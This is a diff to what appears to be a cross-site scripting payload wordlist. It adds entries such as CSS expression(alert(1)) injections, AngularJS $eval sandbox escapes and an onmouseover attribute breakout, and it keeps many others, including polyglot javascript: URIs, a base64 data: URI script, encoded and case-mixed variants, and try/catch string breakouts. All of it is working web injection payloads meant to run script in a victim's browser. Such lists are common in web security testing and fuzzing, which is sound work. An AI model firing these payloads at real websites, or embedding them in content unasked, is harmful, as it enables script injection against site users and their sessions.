@@ -1,4 +1,5 @@
  “-confirm`1`-”
+ \'-alert(1)//
 \”-confirm`1`//
 \”}})})-confirm`1`//
 \”}})})-confirm`1`/*/
@@ -9,36 +10,32 @@
  \”}})})-confirm`1`;({({if(){/*///
  \”}})})-confirm`1`;(function(){({if(){/*///
  \”}})})-confirm`1`(a=>{({b:{/*///
-
-"-confirm(1339)-"
+}{}*{x:expression(alert(1))}{
+}%0a{}*{x:expression(alert(1))}%0a{
+expression(alert(1))
+{x:expression(alert(1))}
+$eval('x=alert(/Mik/)');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(/Mik/)');}}
+” onmouseover=alert(1)//
 confirm(1339);//
 ')confirm(1339);//
 -(confirm)(document.domain)//
 ; confirm(1339)//
 alert%28document.domain%2b'%20XSSed!'%29
-
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
-
 javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
 \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
 java%0ascript:confirm(1339)   - LF (\n)
 javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
-
 %#target%g=alert&uid%g=XSS&
-
 test\"));}catch(e){alert(document.domain)}//
 test\”));}catch(e){alert(document.domain)}//
 \"))} catch(e) {alert(1);}//
 "]);}catch(e){}if(!self.a)self.a=!alert(1);//
 \"));}catch(e){alert(1);}//
-
-
-
 -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
-
-
 window['alert'](0)
 parent['alert'](1)
 self['alert'](2)
@@ -46,7 +43,6 @@ top['alert'](3)
 this['alert'](4)
 frames['alert'](5)
 content['alert'](6)
-
 [7].map(alert)
 [8].find(alert)
 [9].every(alert)
